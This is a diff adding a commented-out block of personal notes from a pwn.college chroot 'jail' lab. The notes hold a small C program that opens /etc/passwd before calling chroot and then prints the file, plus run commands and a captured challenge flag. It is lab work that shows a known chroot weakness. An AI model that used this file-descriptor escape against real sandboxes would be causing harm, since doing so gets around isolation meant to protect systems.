@@ -1,0 +1,72 @@
+/* # ssh -i key hacker@dojo.pwn.college
+
+//# base c file?
+#include <unistd.h>
+#include <stdio.h>
+#include <fcntl.h>
+
+int main()
+{
+        char buf[1024];
+        int fd = open("/etc/passwd", 0);
+        printf("CWD before chroot: %s\n", getcwd(buf, 128));
+        chroot("/tmp");
+        printf("CWD after chroot: %s\n", getcwd(buf, 128));
+        write(1, buf, read(fd, buf, 1024));
+        puts("Goodbye");
+
+
+}
+
+gcc -o jail jail1.c
+
+
+# 1
+
+int main()
+{
+        char buf[1024];
+        int fd = open("/etc/passwd", 0);
+        printf("CWD before chroot: %s\n", getcwd(buf, 128));
+        chroot("/tmp");
+        printf("CWD after chroot: %s\n", getcwd(buf, 128));
+        write(1, buf, read(fd, buf, 1024));
+        puts("Goodbye");
+
+
+}
+
+gcc -o jail jail1.c
+./jail
+
+cd /
+run /challenge/babyjail1 ./flag
+pwn.college{c5Ky7b88agQecU5IesTZZp5Eeas.QXxMjMscTOxUzW}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+*/
+
